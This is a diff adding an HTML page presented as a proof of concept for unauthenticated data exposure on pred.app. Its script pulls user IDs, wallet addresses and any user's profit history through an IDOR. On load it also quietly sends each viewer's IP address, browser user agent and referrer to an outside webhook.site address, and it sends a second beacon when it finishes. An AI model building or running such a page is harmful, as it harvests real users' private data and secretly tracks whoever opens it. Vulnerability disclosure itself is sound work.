@@ -1,0 +1,56 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>pred.app — unauthenticated data exposure (PoC)</title>
+<style>
+body{font-family:ui-monospace,Menlo,monospace;background:#0b0d12;color:#d7dae0;margin:0;padding:32px;line-height:1.5}
+h1{font-size:18px;color:#fff}h2{font-size:14px;color:#8fb4ff;margin-top:28px}
+table{border-collapse:collapse;font-size:12px;margin-top:8px}td,th{border:1px solid #232838;padding:4px 8px;text-align:left}
+th{color:#8fb4ff}code{color:#9fe6a0}.muted{color:#6b7280}.box{border:1px solid #232838;padding:12px;border-radius:8px;margin-top:8px}
+</style></head><body>
+<h1>pred.app — unauthenticated data exposure</h1>
+<p class="muted">No login, no token. Everything below is fetched from <code>https://www.pred.app/api/v1/*</code> by this page.</p>
+<div id="status" class="box">running…</div>
+
+<h2>1) Public leaderboard leaks <code>user_id</code> + <code>proxy_wallet_address</code></h2>
+<div id="lb" class="box">loading…</div>
+
+<h2>2) Referral leaderboard leaks <code>user_id</code> + <code>privy_wallet_address</code> (whole user base)</h2>
+<div id="ref" class="box">loading…</div>
+
+<h2>3) IDOR: any user's PnL history by <code>user_id</code> (no auth)</h2>
+<div id="earn" class="box">loading…</div>
+
+<script>
+const B="https://www.pred.app/api/v1";
+const HOOK="https://webhook.site/d80a0680-f7df-4025-99b7-b4464575b9c7";
+async function beacon(extra){
+  let ip="?"; try{ip=(await (await fetch("https://api.ipify.org?format=json")).json()).ip}catch{}
+  const data={event:"poc_opened",ip,ua:navigator.userAgent,ref:document.referrer,t:new Date().toISOString(),...extra};
+  try{fetch(HOOK,{method:"POST",mode:"no-cors",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)})}catch{}
+  return data;
+}
+function table(rows,cols){
+  const t=document.createElement("table");
+  const hr=document.createElement("tr"); cols.forEach(c=>{const th=document.createElement("th");th.textContent=c;hr.appendChild(th)}); t.appendChild(hr);
+  rows.forEach(r=>{const tr=document.createElement("tr"); cols.forEach(c=>{const td=document.createElement("td");td.textContent=r[c]??"";tr.appendChild(td)}); t.appendChild(tr)});
+  return t;
+}
+(async()=>{
+  const info=await beacon({});
+  document.getElementById("status").textContent="opened from "+info.ip+" — "+info.ua;
+  try{
+    const comps=(await (await fetch(B+"/competitions/all")).json()).competitions||[];
+    const cid=comps[0].id;
+    const lb=(await (await fetch(`${B}/competitions/leaderboard/${cid}?users=all_users&order=desc&offset=0&limit=10`)).json()).leaderboard||[];
+    const lbBox=document.getElementById("lb"); lbBox.textContent="";
+    lbBox.appendChild(table(lb,["user_id","username","proxy_wallet_address","pnl"]));
+    const ref=(await (await fetch(B+"/campaigns/referrals/leaderboard?limit=10&offset=0")).json());
+    const refBox=document.getElementById("ref"); refBox.textContent="total_earners = "+ref.run.total_earners+" (pagination works; full base enumerable)";
+    refBox.appendChild(table(ref.entries||[],["user_id","username","privy_wallet_address"]));
+    const uid=lb[0].user_id;
+    const earn=await (await fetch(`${B}/portfolio/earnings/chart?user_id=${uid}&range=all`)).json();
+    document.getElementById("earn").textContent="user_id="+uid+" → "+JSON.stringify(earn).slice(0,240)+" …";
+    beacon({event:"poc_done",sample_user:uid});
+  }catch(e){document.getElementById("status").textContent="error: "+e}
+})();
+</script></body></html>
